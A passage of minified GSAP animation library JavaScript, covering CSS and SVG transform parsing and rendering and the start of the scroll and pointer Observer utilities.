    if (!r || "none" === r) {
      var o = Bo(n, e, 1),
        s = o && Jn(e, o, 1);
      s && s !== r
        ? ((n = o), (r = s))
        : "borderColor" === n && (r = Jn(e, "borderTopColor"));
    }
    var c,
      p,
      f,
      d,
      v,
      g,
      T,
      m,
      h,
      _,
      y,
      l = new Ht(this._pt, e.style, n, 0, 1, _1),
      u = 0,
      a = 0;
    if (
      ((l.b = r),
      (l.e = i),
      (r += ""),
      "auto" === (i += "") &&
        ((e.style[n] = i), (i = Jn(e, n) || i), (e.style[n] = r)),
      l1((c = [r, i])),
      (i = c[1]),
      (f = (r = c[0]).match(fo) || []),
      (i.match(fo) || []).length)
    ) {
      for (; (p = fo.exec(i)); )
        (T = p[0]),
          (h = i.substring(u, p.index)),
          v
            ? (v = (v + 1) % 5)
            : ("rgba(" === h.substr(-5) || "hsla(" === h.substr(-5)) && (v = 1),
          T !== (g = f[a++] || "") &&
            ((d = parseFloat(g) || 0),
            (y = g.substr((d + "").length)),
            "=" === T.charAt(1) && (T = So(d, T) + y),
            (m = parseFloat(T)),
            (_ = T.substr((m + "").length)),
            (u = fo.lastIndex - _.length),
            _ ||
              ((_ = _ || on.units[n] || y),
              u === i.length && ((i += _), (l.e += _))),
            y !== _ && (d = ti(e, n, g, _) || 0),
            (l._pt = {
              _next: l._pt,
              p: h || 1 === a ? h : ",",
              s: d,
              c: m - d,
              m: (v && v < 4) || "zIndex" === n ? Math.round : 0,
            }));
      l.c = u < i.length ? i.substring(u, i.length) : "";
    } else l.r = "display" === n && "none" === i ? w1 : x1;
    return Ig.test(i) && (l.e = 0), (this._pt = l), l;
  },
  Uh = { top: "0%", bottom: "100%", left: "0%", right: "100%", center: "50%" },
  Zx = function (e) {
    var n = e.split(" "),
      r = n[0],
      i = n[1] || "50%";
    return (
      ("top" === r || "bottom" === r || "left" === i || "right" === i) &&
        ((e = r), (r = i), (i = e)),
      (n[0] = Uh[r] || r),
      (n[1] = Uh[i] || i),
      n.join(" ")
    );
  },
  Jx = function (e, n) {
    if (n.tween && n.tween._time === n.tween._dur) {
      var l,
        u,
        a,
        r = n.t,
        i = r.style,
        o = n.u,
        s = r._gsap;
      if ("all" === o || !0 === o) (i.cssText = ""), (u = 1);
      else
        for (a = (o = o.split(",")).length; --a > -1; )
          (l = o[a]),
            wr[l] && ((u = 1), (l = "transformOrigin" === l ? Un : Se)),
            ul(r, l);
      u &&
        (ul(r, Se),
        s &&
          (s.svg && r.removeAttribute("transform"),
          cl(r, 1),
          (s.uncache = 1),
          S1(i)));
    }
  },
  qu = {
    clearProps: function (e, n, r, i, o) {
      if ("isFromStart" !== o.data) {
        var s = (e._pt = new Ht(e._pt, n, r, 0, 0, Jx));
        return (s.u = i), (s.pr = -10), (s.tween = o), e._props.push(r), 1;
      }
    },
  },
  al = [1, 0, 0, 1, 0, 0],
  P1 = {},
  N1 = function (e) {
    return "matrix(1, 0, 0, 1, 0, 0)" === e || "none" === e || !e;
  },
  Bh = function (e) {
    var n = Jn(e, Se);
    return N1(n) ? al : n.substr(7).match(jg).map(De);
  },
  np = function (e, n) {
    var s,
      l,
      u,
      a,
      r = e._gsap || Ci(e),
      i = e.style,
      o = Bh(e);
    return r.svg && e.getAttribute("transform")
      ? "1,0,0,1,0,0" ===
        (o = [
          (u = e.transform.baseVal.consolidate().matrix).a,
          u.b,
          u.c,
          u.d,
          u.e,
          u.f,
        ]).join(",")
        ? al
        : o
      : (o === al &&
          !e.offsetParent &&
          e !== ko &&
          !r.svg &&
          ((u = i.display),
          (i.display = "block"),
          (!(s = e.parentNode) || !e.offsetParent) &&
            ((a = 1), (l = e.nextElementSibling), ko.appendChild(e)),
          (o = Bh(e)),
          u ? (i.display = u) : ul(e, "display"),
          a &&
            (l
              ? s.insertBefore(e, l)
              : s
              ? s.appendChild(e)
              : ko.removeChild(e))),
        n && o.length > 6 ? [o[0], o[1], o[4], o[5], o[12], o[13]] : o);
  },
  Pf = function (e, n, r, i, o, s) {
    var k,
      S,
      P,
      l = e._gsap,
      u = o || np(e, !0),
      a = l.xOrigin || 0,
      c = l.yOrigin || 0,
      p = l.xOffset || 0,
      f = l.yOffset || 0,
      d = u[0],
      v = u[1],
      g = u[2],
      T = u[3],
      m = u[4],
      h = u[5],
      _ = n.split(" "),
      y = parseFloat(_[0]) || 0,
      C = parseFloat(_[1]) || 0;
    r
      ? u !== al &&
        (S = d * T - v * g) &&
        ((P = y * (-v / S) + C * (d / S) - (d * h - v * m) / S),
        (y = y * (T / S) + C * (-g / S) + (g * h - T * m) / S),
        (C = P))
      : ((y = (k = T1(e)).x + (~_[0].indexOf("%") ? (y / 100) * k.width : y)),
        (C = k.y + (~(_[1] || _[0]).indexOf("%") ? (C / 100) * k.height : C))),
      i || (!1 !== i && l.smooth)
        ? ((m = y - a),
          (h = C - c),
          (l.xOffset = p + (m * d + h * g) - m),
          (l.yOffset = f + (m * v + h * T) - h))
        : (l.xOffset = l.yOffset = 0),
      (l.xOrigin = y),
      (l.yOrigin = C),
      (l.smooth = !!i),
      (l.origin = n),
      (l.originIsAbsolute = !!r),
      (e.style[Un] = "0px 0px"),
      s &&
        (Ar(s, l, "xOrigin", a, y),
        Ar(s, l, "yOrigin", c, C),
        Ar(s, l, "xOffset", p, l.xOffset),
        Ar(s, l, "yOffset", f, l.yOffset)),
      e.setAttribute("data-svg-origin", y + " " + C);
  },
  cl = function (e, n) {
    var r = e._gsap || new f1(e);
    if ("x" in r && !n && !r.uncache) return r;
    var c,
      p,
      f,
      d,
      v,
      g,
      T,
      m,
      h,
      _,
      y,
      C,
      k,
      S,
      E,
      P,
      N,
      I,
      L,
      X,
      W,
      $,
      Y,
      F,
      O,
      z,
      x,
      H,
      ie,
      lt,
      le,
      ze,
      i = e.style,
      o = r.scaleX < 0,
      s = "px",
      l = "deg",
      u = getComputedStyle(e),
      a = Jn(e, Un) || "0";
    return (
      (c = p = f = g = T = m = h = _ = y = 0),
      (d = v = 1),
      (r.svg = !(!e.getCTM || !E1(e))),
      u.translate &&
        (("none" !== u.translate ||
          "none" !== u.scale ||
          "none" !== u.rotate) &&
          (i[Se] =
            ("none" !== u.translate
              ? "translate3d(" +
                (u.translate + " 0 0").split(" ").slice(0, 3).join(", ") +
                ") "
              : "") +
            ("none" !== u.rotate ? "rotate(" + u.rotate + ") " : "") +
            ("none" !== u.scale
              ? "scale(" + u.scale.split(" ").join(",") + ") "
              : "") +
            ("none" !== u[Se] ? u[Se] : "")),
        (i.scale = i.rotate = i.translate = "none")),
      (S = np(e, r.svg)),
      r.svg &&
        (r.uncache
          ? ((O = e.getBBox()),
            (a = r.xOrigin - O.x + "px " + (r.yOrigin - O.y) + "px"),
            (F = ""))
          : (F = !n && e.getAttribute("data-svg-origin")),
        Pf(e, F || a, !!F || r.originIsAbsolute, !1 !== r.smooth, S)),
      (C = r.xOrigin || 0),
      (k = r.yOrigin || 0),
      S !== al &&
        ((I = S[0]),
        (L = S[1]),
        (X = S[2]),
        (W = S[3]),
        (c = $ = S[4]),
        (p = Y = S[5]),
        6 === S.length
          ? ((d = Math.sqrt(I * I + L * L)),
            (v = Math.sqrt(W * W + X * X)),
            (g = I || L ? Qi(L, I) * mi : 0),
            (h = X || W ? Qi(X, W) * mi + g : 0) &&
              (v *= Math.abs(Math.cos(h * Co))),
            r.svg && ((c -= C - (C * I + k * X)), (p -= k - (C * L + k * W))))
          : ((ze = S[6]),
            (lt = S[7]),
            (x = S[8]),
            (H = S[9]),
            (ie = S[10]),
            (le = S[11]),
            (c = S[12]),
            (p = S[13]),
            (f = S[14]),
            (T = (E = Qi(ze, ie)) * mi),
            E &&
              ((F = $ * (P = Math.cos(-E)) + x * (N = Math.sin(-E))),
              (O = Y * P + H * N),
              (z = ze * P + ie * N),
              (x = $ * -N + x * P),
              (H = Y * -N + H * P),
              (ie = ze * -N + ie * P),
              (le = lt * -N + le * P),
              ($ = F),
              (Y = O),
              (ze = z)),
            (m = (E = Qi(-X, ie)) * mi),
            E &&
              ((P = Math.cos(-E)),
              (le = W * (N = Math.sin(-E)) + le * P),
              (I = F = I * P - x * N),
              (L = O = L * P - H * N),
              (X = z = X * P - ie * N)),
            (g = (E = Qi(L, I)) * mi),
            E &&
              ((F = I * (P = Math.cos(E)) + L * (N = Math.sin(E))),
              (O = $ * P + Y * N),
              (L = L * P - I * N),
              (Y = Y * P - $ * N),
              (I = F),
              ($ = O)),
            T &&
              Math.abs(T) + Math.abs(g) > 359.9 &&
              ((T = g = 0), (m = 180 - m)),
            (d = De(Math.sqrt(I * I + L * L + X * X))),
            (v = De(Math.sqrt(Y * Y + ze * ze))),
            (E = Qi($, Y)),
            (h = Math.abs(E) > 2e-4 ? E * mi : 0),
            (y = le ? 1 / (le < 0 ? -le : le) : 0)),
        r.svg &&
          ((F = e.getAttribute("transform")),
          (r.forceCSS = e.setAttribute("transform", "") || !N1(Jn(e, Se))),
          F && e.setAttribute("transform", F))),
      Math.abs(h) > 90 &&
        Math.abs(h) < 270 &&
        (o
          ? ((d *= -1), (h += g <= 0 ? 180 : -180), (g += g <= 0 ? 180 : -180))
          : ((v *= -1), (h += h <= 0 ? 180 : -180))),
      (n = n || r.uncache),
      (r.x =
        c -
        ((r.xPercent =
          c &&
          ((!n && r.xPercent) ||
            (Math.round(e.offsetWidth / 2) === Math.round(-c) ? -50 : 0)))
          ? (e.offsetWidth * r.xPercent) / 100
          : 0) +
        s),
      (r.y =
        p -
        ((r.yPercent =
          p &&
          ((!n && r.yPercent) ||
            (Math.round(e.offsetHeight / 2) === Math.round(-p) ? -50 : 0)))
          ? (e.offsetHeight * r.yPercent) / 100
          : 0) +
        s),
      (r.z = f + s),
      (r.scaleX = De(d)),
      (r.scaleY = De(v)),
      (r.rotation = De(g) + l),
      (r.rotationX = De(T) + l),
      (r.rotationY = De(m) + l),
      (r.skewX = h + l),
      (r.skewY = _ + l),
      (r.transformPerspective = y + s),
      (r.zOrigin = parseFloat(a.split(" ")[2]) || 0) && (i[Un] = Zu(a)),
      (r.xOffset = r.yOffset = 0),
      (r.force3D = on.force3D),
      (r.renderTransform = r.svg ? tw : C1 ? M1 : ew),
      (r.uncache = 0),
      r
    );
  },
  Zu = function (e) {
    return (e = e.split(" "))[0] + " " + e[1];
  },
  ac = function (e, n, r) {
    var i = pt(n);
    return De(parseFloat(n) + parseFloat(ti(e, "x", r + "px", i))) + i;
  },
  ew = function (e, n) {
    (n.z = "0px"),
      (n.rotationY = n.rotationX = "0deg"),
      (n.force3D = 0),
      M1(e, n);
  },
  fi = "0deg",
  ss = "0px",
  di = ") ",
  M1 = function (e, n) {
    var r = n || this,
      i = r.xPercent,
      o = r.yPercent,
      s = r.x,
      l = r.y,
      u = r.z,
      a = r.rotation,
      c = r.rotationY,
      p = r.rotationX,
      f = r.skewX,
      d = r.skewY,
      v = r.scaleX,
      g = r.scaleY,
      T = r.transformPerspective,
      m = r.force3D,
      h = r.target,
      _ = r.zOrigin,
      y = "",
      C = ("auto" === m && e && 1 !== e) || !0 === m;
    if (_ && (p !== fi || c !== fi)) {
      var P,
        k = parseFloat(c) * Co,
        S = Math.sin(k),
        E = Math.cos(k);
      (k = parseFloat(p) * Co),
        (P = Math.cos(k)),
        (s = ac(h, s, S * P * -_)),
        (l = ac(h, l, -Math.sin(k) * -_)),
        (u = ac(h, u, E * P * -_ + _));
    }
    T !== ss && (y += "perspective(" + T + di),
      (i || o) && (y += "translate(" + i + "%, " + o + "%) "),
      (C || s !== ss || l !== ss || u !== ss) &&
        (y +=
          u !== ss || C
            ? "translate3d(" + s + ", " + l + ", " + u + ") "
            : "translate(" + s + ", " + l + di),
      a !== fi && (y += "rotate(" + a + di),
      c !== fi && (y += "rotateY(" + c + di),
      p !== fi && (y += "rotateX(" + p + di),
      (f !== fi || d !== fi) && (y += "skew(" + f + ", " + d + di),
      (1 !== v || 1 !== g) && (y += "scale(" + v + ", " + g + di),
      (h.style[Se] = y || "translate(0, 0)");
  },
  tw = function (e, n) {
    var C,
      k,
      S,
      E,
      P,
      r = n || this,
      i = r.xPercent,
      o = r.yPercent,
      s = r.x,
      l = r.y,
      u = r.rotation,
      a = r.skewX,
      c = r.skewY,
      p = r.scaleX,
      f = r.scaleY,
      d = r.target,
      v = r.xOrigin,
      g = r.yOrigin,
      T = r.xOffset,
      m = r.yOffset,
      h = r.forceCSS,
      _ = parseFloat(s),
      y = parseFloat(l);
    (u = parseFloat(u)),
      (a = parseFloat(a)),
      (c = parseFloat(c)) && ((a += c = parseFloat(c)), (u += c)),
      u || a
        ? ((u *= Co),
          (a *= Co),
          (C = Math.cos(u) * p),
          (k = Math.sin(u) * p),
          (S = Math.sin(u - a) * -f),
          (E = Math.cos(u - a) * f),
          a &&
            ((c *= Co),
            (P = Math.tan(a - c)),
            (S *= P = Math.sqrt(1 + P * P)),
            (E *= P),
            c &&
              ((P = Math.tan(c)), (C *= P = Math.sqrt(1 + P * P)), (k *= P))),
          (C = De(C)),
          (k = De(k)),
          (S = De(S)),
          (E = De(E)))
        : ((C = p), (E = f), (k = S = 0)),
      ((_ && !~(s + "").indexOf("px")) || (y && !~(l + "").indexOf("px"))) &&
        ((_ = ti(d, "x", s, "px")), (y = ti(d, "y", l, "px"))),
      (v || g || T || m) &&
        ((_ = De(_ + v - (v * C + g * S) + T)),
        (y = De(y + g - (v * k + g * E) + m))),
      (i || o) &&
        ((P = d.getBBox()),
        (_ = De(_ + (i / 100) * P.width)),
        (y = De(y + (o / 100) * P.height))),
      (P =
        "matrix(" + C + "," + k + "," + S + "," + E + "," + _ + "," + y + ")"),
      d.setAttribute("transform", P),
      h && (d.style[Se] = P);
  },
  nw = function (e, n, r, i, o) {
    var p,
      f,
      s = 360,
      l = Je(o),
      a = parseFloat(o) * (l && ~o.indexOf("rad") ? mi : 1) - i,
      c = i + a + "deg";
    return (
      l &&
        ("short" === (p = o.split("_")[1]) &&
          (a %= s) !== a % 180 &&
          (a += a < 0 ? s : -s),
        "cw" === p && a < 0
          ? (a = ((a + s * jh) % s) - ~~(a / s) * s)
          : "ccw" === p && a > 0 && (a = ((a - s * jh) % s) - ~~(a / s) * s)),
      (e._pt = f = new Ht(e._pt, n, r, i, a, Ux)),
      (f.e = c),
      (f.u = "deg"),
      e._props.push(r),
      f
    );
  },
  Vh = function (e, n) {
    for (var r in n) e[r] = n[r];
    return e;
  },
  rw = function (e, n, r) {
    var l,
      u,
      a,
      c,
      p,
      f,
      v,
      i = Vh({}, r._gsap),
      s = r.style;
    for (u in (i.svg
      ? ((a = r.getAttribute("transform")),
        r.setAttribute("transform", ""),
        (s[Se] = n),
        (l = cl(r, 1)),
        ul(r, Se),
        r.setAttribute("transform", a))
      : ((a = getComputedStyle(r)[Se]),
        (s[Se] = n),
        (l = cl(r, 1)),
        (s[Se] = a)),
    wr))
      (a = i[u]) !== (c = l[u]) &&
        "perspective,force3D,transformOrigin,svgOrigin".indexOf(u) < 0 &&
        ((p = pt(a) !== (v = pt(c)) ? ti(r, u, a, v) : parseFloat(a)),
        (f = parseFloat(c)),
        (e._pt = new Ht(e._pt, l, u, p, f - p, Cf)),
        (e._pt.u = v || 0),
        e._props.push(u));
    Vh(l, i);
  };
Vt("padding,margin,Width,Radius", function (t, e) {
  var n = "Top",
    r = "Right",
    i = "Bottom",
    o = "Left",
    s = (e < 3 ? [n, r, i, o] : [n + o, n + r, i + r, i + o]).map(function (l) {
      return e < 2 ? t + l : "border" + l + t;
    });
  qu[e > 1 ? "border" + t : t] = function (l, u, a, c, p) {
    var f, d;
    if (arguments.length < 4)
      return (
        (f = s.map(function (v) {
          return ur(l, v, a);
        })),
        5 === (d = f.join(" ")).split(f[0]).length ? f[0] : d
      );
    (f = (c + "").split(" ")),
      (d = {}),
      s.forEach(function (v, g) {
        return (d[v] = f[g] = f[g] || f[((g - 1) / 2) | 0]);
      }),
      l.init(u, d, p);
  };
});
var O1 = {
  name: "css",
  register: Ef,
  targetTest: function (e) {
    return e.style && e.nodeType;
  },
  init: function (e, n, r, i, o) {
    var a,
      c,
      p,
      f,
      d,
      v,
      g,
      T,
      m,
      h,
      _,
      y,
      C,
      k,
      S,
      E,
      s = this._props,
      l = e.style,
      u = r.vars.startAt;
    for (g in (Jd || Ef(),
    (this.styles = this.styles || k1(e)),
    (E = this.styles.props),
    (this.tween = r),
    n))
      if ("autoRound" !== g && ((c = n[g]), !Zt[g] || !d1(g, n, r, i, e, o)))
        if (
          ((d = typeof c),
          (v = qu[g]),
          "function" === d && (d = typeof (c = c.call(r, i, e, o))),
          "string" === d && ~c.indexOf("random(") && (c = sl(c)),
          v)
        )
          v(this, e, g, c, r) && (S = 1);
        else if ("--" === g.substr(0, 2))
          (a = (getComputedStyle(e).getPropertyValue(g) + "").trim()),
            (c += ""),
            (Kr.lastIndex = 0),
            Kr.test(a) || ((T = pt(a)), (m = pt(c))),
            m ? T !== m && (a = ti(e, g, a, m) + m) : T && (c += T),
            this.add(l, "setProperty", a, c, i, o, 0, 0, g),
            s.push(g),
            E.push(g, 0, l[g]);
        else if ("undefined" !== d) {
          if (
            (u && g in u
              ? ((a = "function" == typeof u[g] ? u[g].call(r, i, e, o) : u[g]),
                Je(a) && ~a.indexOf("random(") && (a = sl(a)),
                pt(a + "") || (a += on.units[g] || pt(ur(e, g)) || ""),
                "=" === (a + "").charAt(1) && (a = ur(e, g)))
              : (a = ur(e, g)),
            (f = parseFloat(a)),
            (h = "string" === d && "=" === c.charAt(1) && c.substr(0, 2)) &&
              (c = c.substr(2)),
            (p = parseFloat(c)),
            g in Kn &&
              ("autoAlpha" === g &&
                (1 === f && "hidden" === ur(e, "visibility") && p && (f = 0),
                E.push("visibility", 0, l.visibility),
                Ar(
                  this,
                  l,
                  "visibility",
                  f ? "inherit" : "hidden",
                  p ? "inherit" : "hidden",
                  !p
                )),
              "scale" !== g &&
                "transform" !== g &&
                ~(g = Kn[g]).indexOf(",") &&
                (g = g.split(",")[0])),
            (_ = g in wr))
          )
            if (
              (this.styles.save(g),
              y ||
                (((C = e._gsap).renderTransform && !n.parseTransform) ||
                  cl(e, n.parseTransform),
                (k = !1 !== n.smoothOrigin && C.smooth),
                ((y = this._pt =
                  new Ht(
                    this._pt,
                    l,
                    Se,
                    0,
                    1,
                    C.renderTransform,
                    C,
                    0,
                    -1
                  )).dep = 1)),
              "scale" === g)
            )
              (this._pt = new Ht(
                this._pt,
                C,
                "scaleY",
                C.scaleY,
                (h ? So(C.scaleY, h + p) : p) - C.scaleY || 0,
                Cf
              )),
                (this._pt.u = 0),
                s.push("scaleY", g),
                (g += "X");
            else {
              if ("transformOrigin" === g) {
                E.push(Un, 0, l[Un]),
                  (c = Zx(c)),
                  C.svg
                    ? Pf(e, c, 0, k, 0, this)
                    : ((m = parseFloat(c.split(" ")[2]) || 0) !== C.zOrigin &&
                        Ar(this, C, "zOrigin", C.zOrigin, m),
                      Ar(this, l, g, Zu(a), Zu(c)));
                continue;
              }
              if ("svgOrigin" === g) {
                Pf(e, c, 1, k, 0, this);
                continue;
              }
              if (g in P1) {
                nw(this, C, g, f, h ? So(f, h + c) : c);
                continue;
              }
              if ("smoothOrigin" === g) {
                Ar(this, C, "smooth", C.smooth, c);
                continue;
              }
              if ("force3D" === g) {
                C[g] = c;
                continue;
              }
              if ("transform" === g) {
                rw(this, c, e);
                continue;
              }
            }
          else g in l || (g = Bo(g) || g);
          if (_ || ((p || 0 === p) && (f || 0 === f) && !Fx.test(c) && g in l))
            p || (p = 0),
              (T = (a + "").substr((f + "").length)) !==
                (m = pt(c) || (g in on.units ? on.units[g] : T)) &&
                (f = ti(e, g, a, m)),
              (this._pt = new Ht(
                this._pt,
                _ ? C : l,
                g,
                f,
                (h ? So(f, h + p) : p) - f,
                _ || ("px" !== m && "zIndex" !== g) || !1 === n.autoRound
                  ? Cf
                  : Vx
              )),
              (this._pt.u = m || 0),
              T !== m && "%" !== m && ((this._pt.b = a), (this._pt.r = Bx));
          else if (g in l) qx.call(this, e, g, a, h ? h + c : c);
          else if (g in e) this.add(e, g, a || e[g], h ? h + c : c, i, o);
          else if ("parseTransform" !== g) {
            $d(g, c);
            continue;
          }
          _ || (g in l ? E.push(g, 0, l[g]) : E.push(g, 1, a || e[g])),
            s.push(g);
        }
    S && v1(this);
  },
  render: function (e, n) {
    if (n.tween._time || !ep())
      for (var r = n._pt; r; ) r.r(e, r.d), (r = r._next);
    else n.styles.revert();
  },
  get: ur,
  aliases: Kn,
  getSetter: function (e, n, r) {
    var i = Kn[n];
    return (
      i && i.indexOf(",") < 0 && (n = i),
      n in wr && n !== Un && (e._gsap.x || ur(e, "x"))
        ? r && zh === r
          ? "scale" === n
            ? Wx
            : $x
          : (zh = r || {}) && ("scale" === n ? Yx : Xx)
        : e.style && !Vd(e.style[n])
        ? Hx
        : ~n.indexOf("-")
        ? bx
        : qd(e, n)
    );
  },
  core: { _removeProperty: ul, _getMatrix: np },
};
($t.utils.checkPrefix = Bo),
  ($t.core.getStyleSaver = k1),
  (function (t, e, n, r) {
    var i = Vt(
      t +
        "," +
        e +
        ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",
      function (o) {
        wr[o] = 1;
      }
    );
    Vt(e, function (o) {
      (on.units[o] = "deg"), (P1[o] = 1);
    }),
      (Kn[i[13]] = t + "," + e),
      Vt(
        "0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",
        function (o) {
          var s = o.split(":");
          Kn[s[1]] = i[s[0]];
        }
      );
  })(
    "x,y,z,scale,scaleX,scaleY,xPercent,yPercent",
    "rotation,rotationX,rotationY,skewX,skewY"
  ),
  Vt(
    "x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",
    function (t) {
      on.units[t] = "px";
    }
  ),
  $t.registerPlugin(O1);
var bt = $t.registerPlugin(O1) || $t;
function Hh(t, e) {
  for (var n = 0; n < e.length; n++) {
    var r = e[n];
    (r.enumerable = r.enumerable || !1),
      (r.configurable = !0),
      "value" in r && (r.writable = !0),
      Object.defineProperty(t, r.key, r);
  }
}
function iw(t, e, n) {
  return e && Hh(t.prototype, e), n && Hh(t, n), t;
}
bt.core.Tween;
var it,
  Nf,
  tn,
  Fr,
  Ur,
  To,
  R1,
  gi,
  Ls,
  D1,
  dr,
  On,
  L1,
  z1 = function () {
    return (
      it ||
      (typeof window < "u" && (it = window.gsap) && it.registerPlugin && it)
    );
  },
  j1 = 1,
  ho = [],
  J = [],
  er = [],
  zs = Date.now,
  Mf = function (e, n) {
    return n;
  },
  ow = function () {
    var e = Ls.core,
      n = e.bridge || {},
      r = e._scrollers,
      i = e._proxies;
    r.push.apply(r, J),
      i.push.apply(i, er),
      (J = r),
      (er = i),
      (Mf = function (s, l) {
        return n[s](l);
      });
  },
  qr = function (e, n) {
    return ~er.indexOf(e) && er[er.indexOf(e) + 1][n];
  },
  js = function (e) {
    return !!~D1.indexOf(e);
  },
  Dt = function (e, n, r, i, o) {
    return e.addEventListener(n, r, { passive: !i, capture: !!o });
  },
  kt = function (e, n, r, i) {
    return e.removeEventListener(n, r, !!i);
  },
  Fl = "scrollLeft",
  Ul = "scrollTop",
  Of = function () {
    return (dr && dr.isPressed) || J.cache++;
  },
  Ju = function (e, n) {
    var r = function i(o) {
      if (o || 0 === o) {
        j1 && (tn.history.scrollRestoration = "manual");
        var s = dr && dr.isPressed;
        (o = i.v = Math.round(o) || (dr && dr.iOS ? 1 : 0)),
          e(o),
          (i.cacheID = J.cache),
          s && Mf("ss", o);
      } else
        (n || J.cache !== i.cacheID || Mf("ref")) &&
          ((i.cacheID = J.cache), (i.v = e()));
      return i.v + i.offset;
    };
    return (r.offset = 0), e && r;
  },
  Pt = {
    s: Fl,
    p: "left",
    p2: "Left",
    os: "right",
    os2: "Right",
    d: "width",
    d2: "Width",
    a: "x",
    sc: Ju(function (t) {
      return arguments.length
        ? tn.scrollTo(t, He.sc())
        : tn.pageXOffset || Fr[Fl] || Ur[Fl] || To[Fl] || 0;
    }),
  },
  He = {
    s: Ul,
    p: "top",
    p2: "Top",
    os: "bottom",
    os2: "Bottom",
    d: "height",
    d2: "Height",
    a: "y",
    op: Pt,
    sc: Ju(function (t) {
      return arguments.length
        ? tn.scrollTo(Pt.sc(), t)
        : tn.pageYOffset || Fr[Ul] || Ur[Ul] || To[Ul] || 0;
    }),
  },
  Lt = function (e) {
    return (
      it.utils.toArray(e)[0] ||
      ("string" == typeof e && !1 !== it.config().nullTargetWarn
        ? console.warn("Element not found:", e)
        : null)
    );
  },
  ni = function (e, n) {
    var r = n.s,
      i = n.sc;
    js(e) && (e = Fr.scrollingElement || Ur);
    var o = J.indexOf(e),
      s = i === He.sc ? 1 : 2;
    !~o && (o = J.push(e) - 1), J[o + s] || e.addEventListener("scroll", Of);
    var l = J[o + s],
      u =
        l ||
        (J[o + s] =
          Ju(qr(e, r), !0) ||
          (js(e)
            ? i
            : Ju(function (a) {
                return arguments.length ? (e[r] = a) : e[r];
              })));
    return (
      (u.target = e),
      l || (u.smooth = "smooth" === it.getProperty(e, "scrollBehavior")),
      u
    );
  },
  Rf = function (e, n, r) {
    var i = e,
      o = e,
      s = zs(),
      l = s,
      u = n || 50,
      a = Math.max(500, 3 * u),
      c = function (v, g) {
        var T = zs();
        g || T - s > u
          ? ((o = i), (i = v), (l = s), (s = T))
          : r
          ? (i += v)
          : (i = o + ((v - o) / (T - l)) * (s - l));
      };
    return {
      update: c,
      reset: function () {
        (o = i = r ? 0 : i), (l = s = 0);
      },
      getVelocity: function (v) {
        var g = l,
          T = o,
          m = zs();
        return (
          (v || 0 === v) && v !== i && c(v),
          s === l || m - l > a
            ? 0
            : ((i + (r ? T : -T)) / ((r ? m : s) - g)) * 1e3
        );
      },
    };
  },
  ls = function (e, n) {
    return (
      n && !e._gsapAllow && e.preventDefault(),
      e.changedTouches ? e.changedTouches[0] : e
    );
  },
  bh = function (e) {
    var n = Math.max.apply(Math, e),
      r = Math.min.apply(Math, e);
    return Math.abs(n) >= Math.abs(r) ? n : r;
  },
  I1 = function () {
    (Ls = it.core.globals().ScrollTrigger) && Ls.core && ow();
  },
  A1 = function (e) {
    return (
      (it = e || z1()) &&
        typeof document < "u" &&
        document.body &&
        ((tn = window),
        (Fr = document),
        (Ur = Fr.documentElement),
        (To = Fr.body),
        (D1 = [tn, Fr, Ur, To]),
        it.utils.clamp,
        (L1 = it.core.context || function () {}),
        (gi = "onpointerenter" in To ? "pointer" : "mouse"),
        (R1 = Ue.isTouch =
          tn.matchMedia &&
          tn.matchMedia("(hover: none), (pointer: coarse)").matches
            ? 1
            : "ontouchstart" in tn ||
              navigator.maxTouchPoints > 0 ||
              navigator.msMaxTouchPoints > 0
            ? 2
            : 0),
        (On = Ue.eventTypes =
          (
            "ontouchstart" in Ur
              ? "touchstart,touchmove,touchcancel,touchend"
              : "onpointerdown" in Ur
              ? "pointerdown,pointermove,pointercancel,pointerup"
              : "mousedown,mousemove,mouseup,mouseup"
          ).split(",")),
        setTimeout(function () {
          return (j1 = 0);
        }, 500),
        I1(),
        (Nf = 1)),
      Nf
    );
  };
(Pt.op = He), (J.cache = 0);
var Ue = (function () {
  function t(n) {
    this.init(n);
  }
  return (
    (t.prototype.init = function (r) {
      Nf || A1(it) || console.warn("Please gsap.registerPlugin(Observer)"),
        Ls || I1();
      var i = r.tolerance,
        o = r.dragMinimum,
        s = r.type,
        l = r.target,
        u = r.lineHeight,
        a = r.debounce,
        c = r.preventDefault,
        p = r.onStop,
        f = r.onStopDelay,
        d = r.ignore,
        v = r.wheelSpeed,
        g = r.event,
        T = r.onDragStart,
        m = r.onDragEnd,
        h = r.onDrag,
        _ = r.onPress,
        y = r.onRelease,
        C = r.onRight,
        k = r.onLeft,
        S = r.onUp,
        E = r.onDown,
        P = r.onChangeX,
        N = r.onChangeY,
        I = r.onChange,
        L = r.onToggleX,
        X = r.onToggleY,
        W = r.onHover,
        $ = r.onHoverEnd,
        Y = r.onMove,
        F = r.ignoreCheck,
        O = r.isNormalizer,
        z = r.onGestureStart,
        x = r.onGestureEnd,
        H = r.onWheel,
        ie = r.onEnable,
        lt = r.onDisable,
        le = r.onClick,
        ze = r.scrollSpeed,
        oe = r.capture,
        Ne = r.allowClicks,
        _t = r.lockAxis,
        Wo = r.onLockAxis;
      (this.target = l = Lt(l) || Ur),
        (this.vars = r),
        d && (d = it.utils.toArray(d)),
        (i = i || 1e-9),
        (o = o || 0),
        (v = v || 1),
        (ze = ze || 1),
        (s = s || "wheel,touch,pointer"),
        (a = !1 !== a),
        u || (u = parseFloat(tn.getComputedStyle(To).lineHeight) || 22);
      var Wt,
        cn,
        ee,
        $e,
        Yt,
        Vn,
        vt,
        M = this,
        nr = 0,
        me = 0,
        kr = ni(l, Pt),
        Cr = ni(l, He),
        bi = kr(),
        yt = Cr(),
        Yo =
          ~s.indexOf("touch") &&
          !~s.indexOf("pointer") &&
          "pointerdown" === On[0],
        Tr = js(l),
        Me = l.ownerDocument || Fr,
        Xt = [0, 0, 0],
        xt = [0, 0, 0],
        Xo = 0,
        wt = function () {
          return (Xo = zs());
        },
        Hn = function (B, D) {
          return (
            ((M.event = B) && d && ~d.indexOf(B.target)) ||
            (D && Yo && "touch" !== B.pointerType) ||
            (F && F(B, D))
          );
        },
        Er = function () {
          var B = (M.deltaX = bh(Xt)),
            D = (M.deltaY = bh(xt)),
            U = Math.abs(B) >= i,
            V = Math.abs(D) >= i;
          I && (U || V) && I(M, B, D, Xt, xt),
            U &&
              (C && M.deltaX > 0 && C(M),
              k && M.deltaX < 0 && k(M),
              P && P(M),
              L && M.deltaX < 0 != nr < 0 && L(M),
              (nr = M.deltaX),
